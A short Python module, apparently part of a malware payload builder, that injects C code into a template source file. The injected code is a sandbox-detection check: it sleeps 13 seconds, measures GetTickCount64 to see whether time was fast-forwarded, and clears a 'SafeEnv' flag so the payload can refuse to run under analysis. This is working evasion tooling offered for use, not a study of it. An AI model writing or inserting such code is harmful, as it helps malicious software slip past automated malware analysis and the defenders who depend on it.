def desc():
    return "Check if environment skips time to detect sanboxes"

def run():
    libs = '''\
#define TIME_DELAY 13000 //13 seconds
'''

    functions = '''\
int CheckFastForward() {
  DWORD T0 = GetTickCount64();
  
  // Delay the execution
  Sleep(TIME_DELAY);

  DWORD T1 = GetTickCount64();
  
  // If the execution wasnt delayed then the ticks count is not the same or higher than the delay
  return ((DWORD)(T1 - T0) < TIME_DELAY);
}
'''

    keying = '''\
	if (CheckFastForward())
		SafeEnv = FALSE;\
'''

    # Read the content of the input file
    with open("./src/main.c", 'r') as file:
        content = file.read()

    # Replace the template
    modified_content = content.replace("{{LIBS}}", libs + "\n{{LIBS}}") \
                              .replace("{{FUNCTIONS}}", functions + "\n{{FUNCTIONS}}") \
                              .replace("{{KEYING}}", keying + "\n{{KEYING}}")

    # Write the modified content to the output file
    with open("./src/main.c", 'w') as file:
        file.write(modified_content)

    return